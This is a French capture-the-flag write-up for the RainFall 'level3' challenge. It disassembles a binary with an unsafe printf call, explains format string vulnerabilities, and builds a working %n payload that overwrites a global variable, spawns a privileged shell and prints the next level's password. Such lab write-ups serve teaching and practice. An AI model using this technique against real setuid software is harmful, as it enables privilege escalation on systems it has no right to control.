# Level3: FORMAT STRING

Première étape — tester le programme

```bash
$ ./level3
a
a
```

Le programme affiche l'entrée.

### Ouvrons le binaire
```s
0804851a <main>:
 804851a:	55                   	push   %ebp
 804851b:	89 e5                	mov    %esp,%ebp
 804851d:	83 e4 f0             	and    $0xfffffff0,%esp
 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
 8048525:	c9                   	leave  
 8048526:	c3                   	ret

080484a4 <v>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
 80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484bd:	00
 80484be:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484c4:	89 04 24             	mov    %eax,(%esp)
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484d2:	89 04 24             	mov    %eax,(%esp)
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
 80484df:	83 f8 40             	cmp    $0x40,%eax
 80484e2:	75 34                	jne    8048518 <v+0x74>
 80484e4:	a1 80 98 04 08       	mov    0x8049880,%eax
 80484e9:	89 c2                	mov    %eax,%edx
 80484eb:	b8 00 86 04 08       	mov    $0x8048600,%eax
 80484f0:	89 54 24 0c          	mov    %edx,0xc(%esp)
 80484f4:	c7 44 24 08 0c 00 00  	movl   $0xc,0x8(%esp)
 80484fb:	00
 80484fc:	c7 44 24 04 01 00 00  	movl   $0x1,0x4(%esp)
 8048503:	00
 8048504:	89 04 24             	mov    %eax,(%esp)
 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
 804850c:	c7 04 24 0d 86 04 08  	movl   $0x804860d,(%esp)
 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
 8048518:	c9                   	leave  
 8048519:	c3                   	ret  
```

La première chose que nous pouvons remarquer, c'est que contrairement au niveau précédent nous n'avons pas `gets()` mais `fgets()` (version protégée). Plus loin nous voyons un appel à `printf` particulier : regardons cela de plus près.

```c
void v(void)
{
  char local_20c[520];

  fgets(local_20c, 0x200, stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n", 1, 0xc, stdout);
    system("/bin/sh");
  }
  return;
}
```

- 1ᵉʳ constat : `printf()` prend en paramètre **seulement** le buffer retourné par `fgets()` c'est très dangereux.
- 2ᵉᵐᵉ constat : il existe une condition qui lance un shell (`system`) si `m == 0x40` c'est notre objectif pour obtenir un shell.
- 3ᵉᵐᵉ constat : `m` est une variable globale dans la `.bss` comparée à `0x40` (64).

Comme nous le savons, modifier EAX dans GDB au moment du `cmp` ne suffit pas car le kernel set le **SUIDbinary= RUID**. L'objectif ici est donc de **bypasser la condition à l'exécution** en écrivant la valeur `0x40` dans la variable `m` **depuis** l'exécution normale, via une vulnérabilité de format string.

`fgets` empêche l'overflow classique, donc `ret2ret`/ret-overflow n'est pas applicable ici. En revanche `printf(local_20c)` nous donne une voie : **format string exploit**.

### PRINTF (LIBC) — EXPLOIT FORMAT STRING

`printf` est une très bonne fonction quand elle est utilisée correctement. Exemple sûr :

```c
#include <stdio.h>

int main(void) {
	char buffer[200] = {0};
	fgets(buffer, sizeof(buffer), stdin);
	printf("%s\n", buffer);
}
```

Mais si on fait ceci :

```c
int main(void) {
	char buffer[200] = {0};
	fgets(buffer, sizeof(buffer), stdin);
	printf(buffer); // ⚠️ l'utilisateur contrôle le format
}
```

Alors `printf` interprète la chaîne d'entrée comme **format** : l'attaquant peut utiliser `%x`, `%p`, `%s` pour **lire** la mémoire, ou `%n`, `%hn`, `%hhn` pour **écrire** dans la mémoire.

### Qu'est-ce qu'un "format string exploit" ?

C’est une faille qui arrive quand un programme laisse l’utilisateur écrire directement la phrase que `printf` (ou fonctions similaires) va utiliser pour afficher quelque chose. Imagine que `printf` est une machine qui suit des instructions écrites dans une phrase. Si un utilisateur peut écrire cette phrase, il peut y mettre des instructions que la machine ne devrait pas exécuter.

### Pourquoi c'est dangereux

- `printf("%s", user_input);` → sûr : on affiche la chaîne fournie.
- `printf(user_input);` → dangereux : l’utilisateur peut écrire des marqueurs (`%x`, `%s`, `%n`, …) qui disent à `printf` de lire ou d’écrire dans la mémoire du programme.
- Résultat : fuite d’informations (secrets, adresses) ou modification de la mémoire (changer une variable, forcer un chemin d'exécution).

### Calculez l'offset pour l'attaque

Maintenant que nous avons notre point d'entrée (`printf`) et que nous savons que nous devons bypasser `if (m == 0x40)`, nous allons trouver quel paramètre de notre `printf` contient notre donnée.

```bash
level3@RainFall:~$ ./level3
AAAA%p.%p.%p.%p
AAAA0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141
```

La présence de `0x41414141` (ASCII de `AAAA`) dans la sortie indique que **notre chaîne `AAAA` est présente** à la position d'argument correspondante dans la pile. On utilise donc `%p`/`%x` pour **trouver l'offset** : l'index d'argument de `printf` où se trouve notre donnée.

> _Attention_ : `0x41414141` n'est **pas** automatiquement l'EIP. C'est la valeur `AAAA` trouvée sur la pile. Pour confirmer si l'EIP est écrasé, il faut regarder les registres et la pile dans GDB après un crash.

Maintenant que nous savons que le 4ᵉ paramètre correspond à `AAAA`, on peut utiliser cet offset pour écrire dans la variable `m`.

### Cherchez l'adresse de la variable `m`

Puisque `m` est dans la section `.bss`, on peut trouver son adresse avec `objdump` (ou `readelf`/`nm`). Exemple extrait :

```bash
level3@RainFall:~$ objdump -t ./level3 | grep "\bm\b"
0804988c g     O .bss  00000002 m
```

Ici l'adresse de `m` est `0x0804988c`.

### Créer l'exploit

Principe :
- Placer l'adresse de `m` (little-endian) dans l'entrée pour que `printf` la lise comme argument.
- Imprimer un total de 64 caractères (0x40) puis utiliser `%hhn`/`%n` pour écrire le nombre total d'octets imprimés dans l'adresse `m`.
- Utiliser l'**offset** trouvé auparavant (ici 4) pour indiquer quel argument contient l'adresse.

Exemple de payload :

```bash
python -c 'print b"\x8c\x98\x04\x08" + b"A"*(64-4) + b"%4$n"'
```

Explication :
- `"\x8c\x98\x04\x08"` : adresse de `m` (little-endian).
- `"A"*(64-4)` : on veut que le total des octets imprimés soit 64 ; 4 octets sont déjà comptés par l'adresse, donc on ajoute 60 `A` (ou autre padding) pour atteindre 64.
- `"%4$n"` : on utilise la position 4 (offset) et `%n` pour écrire un octet (la valeur 64) à l'adresse pointée par le 4ᵉ argument.

**Note** : selon l'alignement et la libc, il peut être nécessaire d'ajuster l'offset ou d'utiliser `%n`/`%hn` selon le type de la variable. Les spécificateurs positionnels (`%N$...`) rendent souvent l'exploit plus fiable.

### Exécution (exemple)

```bash
level3@RainFall:~$ (python -c 'print b"\x8c\x98\x04\x08" + b"A"*(64-4) + b"%4$n"'; cat) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
```

Tada ! L'écriture a fonctionné, la condition `m == 0x40` est vraie, le shell est lancé.

```bash
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

Bonne chance et have fun :)

_Pense à tester les offsets dans GDB (ou avec des payloads automatisés) si tu as des différences d'alignement._
